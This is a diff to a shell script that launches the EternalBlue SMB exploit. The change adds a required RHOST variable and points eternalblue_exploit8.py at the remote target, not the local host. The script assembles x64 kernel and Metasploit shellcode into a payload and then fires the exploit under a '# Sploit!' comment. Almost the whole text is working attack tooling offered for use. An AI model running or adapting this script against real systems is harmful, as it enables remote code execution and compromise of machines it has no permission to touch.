@@ -13,6 +13,11 @@ if [ -z "$LHOST" ]; then
     exit
 fi
 
+RHOST="${RHOST:-}"
+if [ -z "$RHOST" ]; then
+    echo -e "RHOST not specified"
+    exit
+fi
 pushd shellcode
 
 find -name '*.bin' -exec rm {} \;
@@ -30,5 +35,5 @@ cat kernel_x64.bin msf_x64.bin > x64_payload.bin
 popd 
 
 # Sploit!
-python2 eternalblue_exploit8.py $LHOST ./shellcode/x64_payload.bin
+python2 eternalblue_exploit8.py $RHOST ./shellcode/x64_payload.bin
 
